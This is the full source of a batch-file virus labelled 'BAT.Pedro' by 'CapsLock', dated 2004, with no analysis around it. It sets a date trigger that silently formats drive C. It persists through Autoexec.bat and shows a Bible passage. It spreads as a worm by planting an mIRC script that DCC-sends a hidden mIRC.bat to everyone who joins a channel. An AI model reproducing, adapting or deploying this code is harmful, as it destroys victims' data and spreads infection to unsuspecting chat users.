   @echo off
   ver|date>C:\WINDOWS\Win.log
   if exist C:\WINDOWS\SYSTEM\System.sys goto fin
   ver|date>x
   find " 01" x|if errorlevel 1 goto 02|if not errorlevel 1 echo find " 13" C:\WINDOWS\Win.log>_b
   goto pedro
   :02
   find " 02" x|if errorlevel 1 goto 03|if not errorlevel 1 echo find " 14" C:\WINDOWS\Win.log>_b
   goto pedro
   :03
   find " 03" x|if errorlevel 1 goto 04|if not errorlevel 1 echo find " 15" C:\WINDOWS\Win.log>_b
   goto pedro
   :04
   find " 04" x|if errorlevel 1 goto 05|if not errorlevel 1 echo find " 16" C:\WINDOWS\Win.log>_b
   goto pedro
   :05
   find " 05" x|if errorlevel 1 goto 06|if not errorlevel 1 echo find " 17" C:\WINDOWS\Win.log>_b
   goto pedro
   :06
   find " 06" x|if errorlevel 1 goto 07|if not errorlevel 1 echo find " 18" C:\WINDOWS\Win.log>_b
   goto pedro
   :07
   find " 07" x|if errorlevel 1 goto 08|if not errorlevel 1 echo find " 19" C:\WINDOWS\Win.log>_b
   goto pedro
   :08
   find " 08" x|if errorlevel 1 goto 09|if not errorlevel 1 echo find " 20" C:\WINDOWS\Win.log>_b
   goto pedro
   :09
   find " 09" x|if errorlevel 1 goto 10|if not errorlevel 1 echo find " 21" C:\WINDOWS\Win.log>_b
   goto pedro
   :10
   find " 10" x|if errorlevel 1 goto 11|if not errorlevel 1 echo find " 22" C:\WINDOWS\Win.log>_b
   goto pedro
   :11
   find " 11" x|if errorlevel 1 goto 12|if not errorlevel 1 echo find " 23" C:\WINDOWS\Win.log>_b
   goto pedro
   :12
   find " 12" x|if errorlevel 1 goto 13|if not errorlevel 1 echo find " 24" C:\WINDOWS\Win.log>_b
   goto pedro
   :13
   find "13" x|if errorlevel 1 goto 14|if not errorlevel 1 echo find " 25" C:\WINDOWS\Win.log>_b
   goto pedro
   :14
   find "14" x|if errorlevel 1 goto 15|if not errorlevel 1 echo find " 26" C:\WINDOWS\Win.log>_b
   goto pedro
   :15
   find "15" x|if errorlevel 1 goto 16|if not errorlevel 1 echo find " 27" C:\WINDOWS\Win.log>_b
   goto pedro
   :16
   find "16" x|if errorlevel 1 goto 17|if not errorlevel 1 echo find " 28" C:\WINDOWS\Win.log>_b
   goto pedro
   :17
   find "17" x|if errorlevel 1 goto 18|if not errorlevel 1 echo find " 29" C:\WINDOWS\Win.log>_b
   goto pedro
   :18
   find "18" x|if errorlevel 1 goto 19|if not errorlevel 1 echo find " 30" C:\WINDOWS\Win.log>_b
   goto pedro
   :19
   find "19" x|if errorlevel 1 goto 20|if not errorlevel 1 echo find " 01" C:\WINDOWS\Win.log>_b
   goto pedro
   :20
   find " 20" x|if errorlevel 1 goto 21|if not errorlevel 1 echo find " 02" C:\WINDOWS\Win.log>_b
   goto pedro
   :21
   find "21" x|if errorlevel 1 goto 22|if not errorlevel 1 echo find " 03" C:\WINDOWS\Win.log>_b
   goto pedro
   :22
   find "22" x|if errorlevel 1 goto 23|if not errorlevel 1 echo find " 04" C:\WINDOWS\Win.log>_b
   goto pedro
   :23
   find "23" x|if errorlevel 1 goto 24|if not errorlevel 1 echo find " 05" C:\WINDOWS\Win.log>_b
   goto pedro
   :24
   find "24" x|if errorlevel 1 goto 25|if not errorlevel 1 echo find " 06" C:\WINDOWS\Win.log>_b
   goto pedro
   :25
   find "25" x|if errorlevel 1 goto 26|if not errorlevel 1 echo find " 07" C:\WINDOWS\Win.log>_b
   goto pedro
   :26
   find "26" x|if errorlevel 1 goto 27|if not errorlevel 1 echo find " 08" C:\WINDOWS\Win.log>_b
   goto pedro
   :27
   find "27" x|if errorlevel 1 goto 28|if not errorlevel 1 echo find " 09" C:\WINDOWS\Win.log>_b
   goto pedro
   :28
   find "28" x|if errorlevel 1 goto 29|if not errorlevel 1 echo find " 10" C:\WINDOWS\Win.log>_b
   goto pedro
   :29
   find "29" x|if errorlevel 1 goto 30|if not errorlevel 1 echo find " 11" C:\WINDOWS\Win.log>_b
   goto pedro
   :30
   find "30" x|if errorlevel 1 goto 31|if not errorlevel 1 echo find " 12" C:\WINDOWS\Win.log>_b
   goto pedro
   :31
   find "31" x|if errorlevel 1 goto Pedro|if not errorlevel 1 echo find " 13" C:\WINDOWS\Win.log>_b
   goto pedro
   :pedro
   echo @echo off>_a
   echo if errorlevel 1 goto apostol>_c
   echo if not errorlevel 1 format C: /q /autotest>_d
   echo cls>_e
   echo echo               -------------------------------------------------->_f
   echo echo                                   BAT.Pedro>_g
   echo echo                                  por CapsLock>_h
   echo echo               -------------------------------------------------->_i
   echo echo               Y andando Jesus junto a la mar de Galilea,>_j
   echo echo               vio a dos hermanos, Simon, que es llamado Pedro,>_k
   echo echo               y Andres su hermano, que echaban la red en la mar,>_l
   echo echo               porque eran pescadores.>_m
   echo echo.>_n
   echo echo               Y deciles: Venid en pos de mi,>_o
   echo echo               y os hare pescadores de hombres.>_p
   echo echo.>_q
   echo echo               Ellos entonces, dejando luego las redes,>_r
   echo echo               le siguieron.>_s
   echo echo.>_t
   echo echo                                                San Mateo 4:18-20>_u
   echo echo               -------------------------------------------------->_v
   echo echo.>_w
   echo echo.>_x
   echo echo.>_y
   echo echo.>_z
   echo echo.>_1
   echo echo.>_2
   echo echo.>_3
   echo :apostol>_4
   copy _a+_b+_c+_d+_e+_f+_g+_h+_i+_j+_k+_l+_m+_n+_o+_p+_q+_r+_s+_t+_u+_v+_w+_x+_y+_z+_1+_2+_3+_4 C:\WINDOWS\Win.bat>nul
   del _?
   del x
   echo @call C:\WINDOWS\User.bat>>C:\Autoexec.bat
   echo @call C:\WINDOWS\Win.bat>>C:\Autoexec.bat
   echo [windows]>C:\WINDOWS\SYSTEM\System.sys
   echo load=>>C:\WINDOWS\SYSTEM\System.sys
   echo run=>>C:\WINDOWS\SYSTEM\System.sys
   echo NullPort=None>>C:\WINDOWS\SYSTEM\System.sys
   if not exist C:\WINDOWS\User.bat copy mIRC.bat C:\WINDOWS\User.bat>nul
   if not exist C:\WINDOWS\mIRC.bat copy mIRC.bat C:\WINDOWS\mIRC.bat>nul
   echo [script]>-0
   echo n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }>-1
   echo n1= /dcc send $nick C:\WINDOWS\mIRC.bat>-2
   echo n2=}>-3
   echo n3=>-4
   echo n4=ON 1:connect: {>-5
   echo n5= /run attrib +r +s +h C:\WINDOWS\mIRC.bat>-6
   echo n6=}>-7
   copy -0+-1+-2+-3+-4+-5+-6+-7 C:\script.ini>nul
   if exist C:\mIRC\mirc.exe copy C:\script.ini C:\mIRC>nul
   if exist C:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini C:\ARCHIV~1\mIRC>nul
   if exist C:\PROGRA~1\mIRC\mirc.exe copy C:\script.ini C:\PROGRA~1\mIRC>nul
   if exist D:\mIRC\mirc.exe copy C:\script.ini D:\mIRC>nul
   if exist D:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini D:\ARCHIV~1\mIRC>nul
   if exist D:\PROGRA~1\mIRC\mirc.exe copy C:\script.ini D:\PROGRA~1\mIRC>nul
   del C:\script.ini
   del -?
   :fin
   exit<nul
   :: Nombre: BAT.Pedro
   :: Creado por: CapsLock
   :: Fecha de creacion: 30/06/2004
